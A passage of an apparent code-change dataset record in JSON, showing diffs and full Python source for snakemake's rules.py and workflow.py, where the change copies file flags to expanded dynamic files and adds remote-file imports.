appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re","add":6,"remove":1,"filename":"\/snakemake\/rules.py","badparts":["                        expansion[i].append(IOFile(e, rule=branch))"],"goodparts":["                        ioFile = IOFile(e, rule=branch)","                        ioFile.clone_flags(f)","                        expansion[i].append(ioFile)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"},"\/snakemake\/workflow.py":{"changes":[{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]},{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: 